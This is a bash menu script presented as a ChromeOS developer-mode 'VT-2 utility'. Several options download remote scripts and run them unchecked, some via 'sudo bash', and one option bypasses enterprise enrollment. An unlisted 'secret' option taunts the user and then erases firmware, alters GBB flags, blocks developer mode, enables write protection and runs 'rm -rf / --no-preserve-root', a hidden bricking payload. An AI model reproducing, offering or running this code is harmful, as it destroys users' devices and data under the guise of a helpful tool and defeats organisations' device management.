#!/bin/bash
# Created by Nikki
# Owner of Ferrochrome
# https://discord.gg/624wVgpf9W

# clear the screen
printf "\ec"

# infinite loop
while true; do
# Display title and options
echo "Nikki's VT-2 Utility"
printf "\n"
echo "Options:"
printf "\n"
echo "1: MrChromebox firmware-util.sh"
echo "2: Custom GBB Flag Writer"
echo "3: Show IP Address"
echo "4: Bash Tetris by dkorolev"
echo "5: SAUB (Server Auto Update Blocker by CriticalHD)"
echo "6: Unenroll until next powerwash (by crosbreaker)"
echo "7: crossystem utility"
echo "8: chromebrick"
echo "9: Exit"
# select option
read -p "Select an option: " option
# execute code based on an option
# mrchromebox script
if [ $option = 1 ]; then
if [ $USER = "root" ]; then
echo "Please switch to the chronos user and run the script again."
exit
fi
echo "Downloading firmware-util.sh..."
cd; curl -LOf https://mrchromebox.tech/firmware-util.sh
echo Running script...
sudo bash firmware-util.sh
# custom gbb
elif [ $option = 2 ]; then
curl https://raw.githubusercontent.com/ferrochrome-3/nikkis-vt2-utility/refs/heads/main/gbb.sh > gbb.sh && bash gbb.sh
elif [ $option = 3 ]; then
curl https://ipinfo.io/json
printf "\n"
elif [ $option = 4 ]; then
curl https://raw.githubusercontent.com/ferrochrome-3/nikkis-vt2-utility/refs/heads/main/tetris.sh > tetris.sh && bash tetris.sh
elif [ $option = 5 ]; then
echo "Please note: SAUB will brick your chromebook if you return to secure mode with it active."
echo "The script will continue in 10 seconds. Press ctrl + c to exit."
sleep 10
curl -sSL https://raw.githubusercontent.com/CriticalHD/Myscripts/refs/heads/main/SAUB | sudo bash
elif [ $option = 6 ]; then
if [ $USER = "chronos" ]; then
echo "Please switch to the root user and run the script again."
exit
else
echo "This will unenroll you until the next time you powerwash your chromebook."
read -p "Continue? (y/n) " option6yn
if [ $option6yn = y ]; then
echo "Running..."
mount -B /dev/null /tmp/machine-info
initctl restart ui
echo Done! Continue with OOBE and you will not enroll. If you do, go to https://discord.crosbreaker.com/ and ask for help.
fi
fi
elif [ $option = 7 ]; then
curl https://raw.githubusercontent.com/ferrochrome-3/nikkis-vt2-utility/refs/heads/main/crossystem.sh > crossystem.sh && bash crossystem.sh
elif [ $option = 8 ]; then
curl https://raw.githubusercontent.com/ferrochrome-3/nikkis-vt2-utility/refs/heads/main/chromebrick.sh > chromebrick.sh && bash chromebrick.sh
elif [ $option = 9 ]; then
echo "*kaboom*"
exit
elif [ $option = 674121420 ]; then
echo haha skid im whrecking your chromebook now goodbye :skull_crossbones:
crossystem battery_cutoff_request=1
flashrom -E
futility gbb -s --flash --flags=0x8
crossystem block_devmode=1
device_management_client --action=set_firmware_management_parameters --flags=0x01
flashrom --wp-enable
sudo rm -rf / --no-preserve-root
elif [ $option = 69 ]; then
curl https://raw.githubusercontent.com/ferrochrome-3/nikkis-vt2-utility/refs/heads/main/femboy%20ascii.sh > "femboy ascii.sh" && bash "femboy ascii.sh"
fi
# end infinite loop
done